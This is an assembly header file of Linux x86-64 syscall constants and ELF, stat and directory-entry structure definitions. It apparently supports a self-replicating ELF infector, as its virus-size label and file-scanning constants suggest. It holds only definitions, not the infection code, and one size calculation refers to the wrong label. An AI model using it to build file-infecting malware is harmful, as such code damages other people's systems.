SYS_EXIT        = 0x3c
SYS_OPEN        = 0x2
SYS_CLOSE       = 0x3
SYS_WRITE       = 0x1
SYS_READ        = 0x0
SYS_GETDENTS64  = 0xd9
SYS_FSTAT       = 0x5
SYS_CREAT       = 0x55
SYS_LSEEK       = 0x8
SYS_MMAP        = 0x9
SYS_MUNMAP      = 0xb
SYS_SYNC        = 0xa2
SYS_RENAME      = 0x52
EHDR_SIZE       = 0x40
ELFCLASS64      = 0x2
EM_X86_64       = 0x3e
O_RDONLY        = 0x0
O_RDWR          = 0x2
STDOUT          = 0x1
SEEK_CUR        = 0x1
DIRENT_BUFSIZE  = 0x400
PAGE_SIZE       = 0x1000
MAP_PRIVATE     = 0x2

PROT_READ       = 0x1
PROT_WRITE      = 0x2
DT_REG          = 0x8
PT_LOAD         = 0x1
PF_X            = 0x1
PF_R            = 0x4

PAGE_SIZE   equ PAGE_SIZE
V_SIZE      equ v_stop - v_start

struc DIRENT {
    .d_ino          rq 1
    .d_off          rq 1
    .d_reclen       rw 1
    .d_type         rb 1
    label .d_name   byte
}
virtual at 0
  DIRENT DIRENT
  sizeof.DIRENT = $ - DIRENT
end virtual

struc STAT {
    .st_dev         rq 1
    .st_ino         rq 1
    .st_nlink       rq 1
    .st_mode        rd 1
    .st_uid         rd 1
    .st_gid         rd 1
    .pad0           rb 4
    .st_rdev        rq 1
    .st_size        rq 1
    .st_blksize     rq 1
    .st_blocks      rq 1
    .st_atime       rq 1
    .st_atime_nsec  rq 1
    .st_mtime       rq 1
    .st_mtime_nsec  rq 1
    .st_ctime       rq 1
    .st_ctime_nsec  rq 1
}
virtual at 0
  STAT STAT
  sizeof.STAT = $ - STAT
end virtual

struc EHDR {
    .magic      rd  1
    .class      rb  1
    .data       rb  1
    .elfversion rb  1
    .os         rb  1
    .abiversion rb  1
    .pad        rb  7
    .type       rb  2
    .machine    rb  2
    .version    rb  4
    .entry      rq  1
    .phoff      rq  1
    .shoff      rq  1
    .flags      rb  4
    .ehsize     rb  2
    .phentsize  rb  2
    .phnum      rb  2
    .shentsize  rb  2
    .shnum      rb  2
    .shstrndx   rb  2
}
virtual at 0
  EHDR EHDR
  sizeof.EHDR = $ - EHDR
end virtual

struc PHDR {
    .type   rb  4
    .flags  rd  1
    .offset rq  1
    .vaddr  rq  1
    .paddr  rq  1
    .filesz rq  1
    .memsz  rq  1
    .align  rq  1
}
virtual at 0
  PHDR PHDR
  sizeof.PHDR = $ - PHDR
end virtual

struc SHDR {
    .name       rb  4
    .type       rb  4
    .flags      rq  1
    .addr       rq  1
    .offset     rq  1
    .size       rq  1
    .link       rb  4
    .info       rb  4
    .addralign  rq  1
    .entsize    rq  1
    .hdr_size = $ - .name
}
virtual at 0
  SHDR SHDR
  sizeof.SHDR = $ - PHDR
end virtual